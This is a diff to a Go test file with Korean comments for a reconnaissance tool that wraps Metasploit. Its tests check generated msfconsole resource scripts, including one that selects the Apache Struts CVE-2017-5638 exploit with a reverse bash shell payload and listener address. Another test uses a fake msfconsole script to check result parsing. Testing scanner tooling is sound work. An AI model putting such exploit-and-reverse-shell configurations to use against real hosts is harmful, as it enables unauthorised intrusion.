@@ -1,8 +1,14 @@
 package service
 
 import (
+	"context"
+	"os"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
+
+	"github.com/rikychoi/recon/internal/model"
 )
 
 // TestParseMSFOutput은 msfconsole 출력에서 [+] 결과만 취약점으로 추출하는지 검증한다.
@@ -45,12 +51,69 @@ func TestExtractMSFTarget(t *testing.T) {
 	}
 }
 
-// TestBuildResourceScript는 생성된 msfconsole 리소스 명령이 모듈과 대상을 포함하는지 검증한다.
+// TestBuildResourceScript는 생성된 msfconsole 리소스 명령이 모듈·대상·포트·페이로드·LHOST를 포함하는지 검증한다.
 func TestBuildResourceScript(t *testing.T) {
-	got := buildResourceScript("auxiliary/scanner/http/http_version", "1.1.1.1 2.2.2.2")
-	for _, want := range []string{"use auxiliary/scanner/http/http_version", "set RHOSTS 1.1.1.1 2.2.2.2", "run", "exit"} {
+	// exploit 모듈 + 포트/페이로드/LHOST/LPORT가 지정되면 모두 설정해야 한다.
+	got := buildResourceScript(msfRun{
+		mod:    MSFModule{Name: "exploit/multi/http/struts2_content_type_ognl", Payload: "cmd/unix/reverse_bash"},
+		rhosts: "1.1.1.1 2.2.2.2",
+		rport:  "8080",
+		lhost:  "10.0.0.5",
+		lport:  4444,
+	})
+	for _, want := range []string{
+		"use exploit/multi/http/struts2_content_type_ognl",
+		"set RHOSTS 1.1.1.1 2.2.2.2",
+		"set RPORT 8080",
+		"set PAYLOAD cmd/unix/reverse_bash",
+		"set LHOST 10.0.0.5",
+		"set LPORT 4444",
+		"run",
+		"exit",
+	} {
 		if !strings.Contains(got, want) {
 			t.Errorf("리소스 스크립트에 %q가 없음: %q", want, got)
 		}
+	}
+
+	// 포트/페이로드/LHOST가 비면 해당 항목을 설정하지 않아야 한다(모듈 기본값 사용).
+	noOpt := buildResourceScript(msfRun{mod: MSFModule{Name: "auxiliary/scanner/http/log4shell_scanner"}, rhosts: "1.1.1.1"})
+	for _, unwanted := range []string{"RPORT", "PAYLOAD", "LHOST", "LPORT"} {
+		if strings.Contains(noOpt, unwanted) {
+			t.Errorf("미지정 항목 %q가 스크립트에 포함됨: %q", unwanted, noOpt)
+		}
+	}
+}
+
+// TestMetasploitScanWithFakeBinary는 가짜 msfconsole 바이너리를 주입하여
+// Scan의 실행(exec)→파싱 전 구간이 CVE 취약점을 올바로 수집하는지 검증한다(실제 metasploit 불필요).
+func TestMetasploitScanWithFakeBinary(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("가짜 셸 스크립트 바이너리는 유닉스 환경에서만 실행한다")
+	}
+
+	// 어떤 인자를 받든 취약 판정([+]) 한 줄을 출력하는 가짜 msfconsole.
+	dir := t.TempDir()
+	fake := filepath.Join(dir, "fake-msfconsole")
+	script := "#!/bin/sh\n" +
+		"echo '[*] Running module...'\n" +
+		"echo '[+] 1.2.3.4:8080 - Vulnerable to CVE-2017-5638 (Apache Struts)'\n"
+	if err := os.WriteFile(fake, []byte(script), 0o755); err != nil {
+		t.Fatalf("가짜 바이너리 작성 실패: %v", err)
+	}
+
+	mod := MSFModule{Name: "exploit/multi/http/struts2_content_type_ognl", CVE: "CVE-2017-5638", CVSS: 9.8, Port: 8080, Service: "http"}
+	s := NewMetasploitScanner(fake, mod)
+
+	vulns, err := s.Scan(context.Background(), []model.Port{{Target: "1.2.3.4", Number: 8080, Service: "http"}})
+	if err != nil {
+		t.Fatalf("Scan 오류: %v", err)
+	}
+	if len(vulns) != 1 {
+		t.Fatalf("취약점 수 = %d, 기대값 1 (%+v)", len(vulns), vulns)
+	}
+	v := vulns[0]
+	if v.ID != "CVE-2017-5638" || v.Source != "metasploit" || v.Target != "1.2.3.4:8080" || v.Severity != "critical" {
+		t.Errorf("수집된 취약점 필드 오류: %+v", v)
 	}
 }
